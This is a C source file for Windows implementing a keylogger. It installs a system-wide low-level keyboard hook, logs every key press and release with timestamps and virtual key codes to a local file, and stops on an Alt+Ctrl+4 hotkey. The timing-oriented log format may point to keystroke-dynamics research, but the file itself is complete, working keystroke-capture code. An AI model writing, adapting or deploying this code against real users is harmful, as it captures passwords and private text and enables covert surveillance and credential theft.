#include "lib_keylog.h"
#include "colors.h"
#include <windows.h>
#include <stdio.h>


/*
*   Create a seperate thread "KeyLogger" and let it run forever.
*/
int StartThread(char* argv[]) {
    HANDLE hThread;

    /*
    *   lpThreadAttributes: NULL - use default attributes
    *   dwStackSize:        0 - use default size
    *   lpStartAddress:     KeyLogger - pointer to our custom function
    *   lpParameter:        argv[0] - variables passed to the thread
    *   dwCreationFlag:     0 - run the thread immediately after creation
    *   pThreadId:          NULL - don't return a thread identifier
    *  @return: a handle to the created thread  
    */
    hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE) KeyLogger, (LPVOID) argv[0], 0, NULL);

    if (hThread) {
        // Wait for the thread to return (set interval to infinite)
        return WaitForSingleObject(hThread, INFINITE);
    }

    return EXIT_FAILURE;
}

/*
*   Setup a hook for low level keyboard events and assign it the callback "LowLevelKeyboardProc".
*   Handles a hotkey "alt + ctrl + 4" to terminate the thread.
*/
DWORD WINAPI KeyLogger(LPVOID lpParameter) {

    // Create a handle for hooks
    HHOOK hKeyHook;

    // Get the handle for the file used to create this process
    HINSTANCE hModule = GetModuleHandle(NULL);

    if (!hModule) {
        return EXIT_FAILURE;
    } else {
        /*
        *   Install a hook for low level keyboard events.
        *   idHook - WH_KEYBOARD_LL:        type of hook procedure (monitor low level keyboard events)
        *   lpfn - LowLevelKeyboardProc:    pointer to the hook procedure
        *   hMod - hModule:                 handle to the dll containing the hook procedure
        *   dwThreadId - 0:                 associate the hook procedure with all (existing) running threads
        *  @return: the handle of the hook procedure on success, else NULL
        */
        hKeyHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC) LowLevelKeyboardProc, hModule, 0);

        /*
        *   Define a system wide hotkey of "alt + ctrl + 4"
        *   hWnd - NULL:                        handle of a window to receive a generated hot key message (optional)
        *   id - 1:                             identifier of the hot key
        *   fsModifiers: MOD_ALT | MOD_CONTROL: keys that must be pressed in conjunction with the virtual key specified (ALT + CTRL)
        *   vk - 0x34 ("4"):                    virtual key cdoe of the hotkey
        */
        RegisterHotKey(NULL, 1, MOD_ALT | MOD_CONTROL, 0x34);

        MSG msg;

        BOOL bRet;

        // Retrieve all messages from the threads message queue and send them to the appropriate window
        // Only returns zero when receiving WM_QUIT (application is closed)
        while ((bRet = GetMessage(&msg, NULL, 0, 0)) != 0) {

            // Make sure to handle an error in the message queue (like an invalid parameter)
            // For more information see here: https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-getmessage
            if (bRet == -1) {
                UnhookWindowsHookEx(hKeyHook);
                return EXIT_FAILURE;
            }

            // When the hot key was pressed, close the keylogger thread entirely
            if (msg.message == WM_HOTKEY) {
                UnhookWindowsHookEx(hKeyHook);
                return EXIT_SUCCESS;
            }

            // Translate virtual key message to character message
            TranslateMessage(&msg);
            // Dispatch messsage to a window procedure
            DispatchMessage(&msg);
        }

        UnhookWindowsHookEx(hKeyHook);
    }
    return EXIT_SUCCESS;
}

/*
*   Callback function for a hook on low level keyboard events.
*       nCode:  code of the hook message (used to determine how to process the message)
*       wParam: identifier of the keyboard message (WM_KEYDOWN | WM_KEYUP | WM_SYSKEYDOWN | WM_SYSKEYUP)
*       lParam: pointer to a KBDLLHOOKSTRUCT structure (containing detailed information about the event)
*/
LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {

    // Store information about the event in a struct;
    // Details on this structure: https://docs.microsoft.com/en-us/windows/win32/api/winuser/ns-winuser-kbdllhookstruct
    KBDLLHOOKSTRUCT *pKeyBoard = (KBDLLHOOKSTRUCT *) lParam;

    char logMsg[21];

    switch (wParam)
    {
    // Key pressed
    case WM_KEYDOWN:
        sprintf(logMsg, "%012lu;0;0x%02lx\n", pKeyBoard->time, pKeyBoard->vkCode);
        keyLog(logMsg);
        break;

    // Key released
    case WM_KEYUP:
        sprintf(logMsg, "%012lu;1;0x%02lx\n", pKeyBoard->time, pKeyBoard->vkCode);
        keyLog(logMsg);
        break;

    // Neither WM_KEYDOWN nor WM_KEYUP
    default:
        // Pass the hook information to the next hook procedure in the current hook chain
        return CallNextHookEx(NULL, nCode, wParam, lParam);   
    }
    return EXIT_SUCCESS;
}

/*
*   Save formatted event data.
*/
void keyLog(char fs[]) {
    char logPath[MAX_PATH];
    char* logDest = LOG_DESTINATION;
    ExpandEnvironmentStrings(logDest, logPath, MAX_PATH);

    FILE* logFile = fopen(logPath, "a+");

    fputs(fs, logFile);
    fclose(logFile);

    // Comment the following line to suppress terminal output of the logged event
    //fprintf(stderr, "\t\t%s[>]%s %s%s%s", FC_PURPLE, FC_END, FC_CYAN, fs, FC_END);
}
